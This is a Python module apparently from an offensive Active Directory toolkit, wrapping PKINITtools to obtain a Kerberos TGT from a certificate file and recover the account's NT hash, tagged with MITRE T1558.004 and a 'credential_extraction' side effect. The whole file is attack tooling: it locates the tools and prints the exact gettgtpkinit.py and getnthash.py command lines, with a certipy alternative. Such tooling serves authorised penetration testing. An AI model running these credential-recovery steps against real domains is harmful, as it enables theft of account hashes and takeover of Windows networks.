"""PKINITtools  -  PKINIT authentication and TGT/NT hash recovery."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.adcs.pkinit_tools.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["authentication", "credential_extraction"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.004"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", None)

    print("[*] PKINITtools: PKINIT authentication tools")
    print(f"[*] Domain: {cred.domain}")

    import subprocess
    import shutil
    gettgtpkinit = shutil.which("gettgtpkinit.py") or shutil.which("gettgtpkinit")
    getnthash = shutil.which("getnthash.py") or shutil.which("getnthash")

    if gettgtpkinit:
        cmd = [gettgtpkinit, "-cert-pfx", "cert.pfx",
               "-dc-ip", dc_ip or "", "{}/{}".format(cred.domain, cred.username or ""),
               "output.ccache"]
        print("[*] Step 1  -  Get TGT via PKINIT:")
        print("[*] CMD: {}".format(" ".join(cmd)))

    if getnthash:
        print("[*] Step 2  -  Recover NT hash from TGT:")
        print("[*] CMD: getnthash.py -key <AS-REP-KEY> {}/{}".format(cred.domain, cred.username or ""))

    if not gettgtpkinit and not getnthash:
        print("[!] PKINITtools not found")
        print("[*] Install: pip install PKINITtools")
        print("[*] Alternative: certipy auth -pfx cert.pfx")

    return 0
